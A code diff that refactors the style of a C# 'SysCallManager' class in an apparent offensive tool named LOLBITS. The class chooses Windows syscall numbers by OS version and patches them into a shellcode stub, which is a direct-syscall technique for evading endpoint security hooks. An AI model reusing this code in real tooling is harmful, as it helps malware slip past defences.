@@ -21,11 +21,11 @@ namespace LOLBITS
         public SysCallManager()
         {
             /////////////NtAllocateVirtualMemory
-            Dictionary<string, int> val2008 = new Dictionary<string, int>();
-            Dictionary<string, int> val2012 = new Dictionary<string, int>();
-            Dictionary<string, int> val7 = new Dictionary<string, int>();
-            Dictionary<string, int> val8 = new Dictionary<string, int>();
-            Dictionary<string, int> val10 = new Dictionary<string, int>();
+            var val2008 = new Dictionary<string, int>();
+            var val2012 = new Dictionary<string, int>();
+            var val7 = new Dictionary<string, int>();
+            var val8 = new Dictionary<string, int>();
+            var val10 = new Dictionary<string, int>();
 
             val2008.Add("UNIQUE", 0x0015);
 
@@ -165,17 +165,17 @@ namespace LOLBITS
 
         public byte[] GetSysCallAsm(string functionName)
         {
-            string subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
-            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine;
-            Microsoft.Win32.RegistryKey sKey = key.OpenSubKey(subKey);
+            const string subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
+            var key = Microsoft.Win32.Registry.LocalMachine;
+            var sKey = key.OpenSubKey(subKey);
 
-            string product = sKey.GetValue("ProductName").ToString();
-            string release = sKey.GetValue("ReleaseId").ToString();
+            var product = sKey?.GetValue("ProductName").ToString();
+            var release = sKey?.GetValue("ReleaseId").ToString();
 
-            string[] ver = product.Split(' ');
+            var ver = product?.Split(' ');
             Dictionary<string, Dictionary<string, int>> dict = null;
 
-            if(ver[1] == "Server")
+            if(ver?[1] == "Server")
             {
                 switch (ver[2]){
                     case "2008": { dict = _dicWinServer2008; break; }
@@ -187,7 +187,7 @@ namespace LOLBITS
             }
             else
             {
-                switch (ver[1])
+                switch (ver?[1])
                 {
                     case "7": { dict = _dicWin7; break; }
                     case "8": { dict = _dicWin8; break; }
@@ -196,9 +196,9 @@ namespace LOLBITS
                 }
             }
 
-            Dictionary<string, int> funcName = dict[functionName];
-            int sysCallValue = funcName.ContainsKey("UNIQUE") ? funcName["UNIQUE"] : funcName[release];
-            byte[] copy = _shellCode;
+            var funcName = dict[functionName];
+            var sysCallValue = funcName.ContainsKey("UNIQUE") ? funcName["UNIQUE"] : funcName[release];
+            var copy = _shellCode;
             var sysCallIdentifierBytes = BitConverter.GetBytes(sysCallValue);
             Buffer.BlockCopy(sysCallIdentifierBytes, 0, copy, 4, sizeof(uint));
 
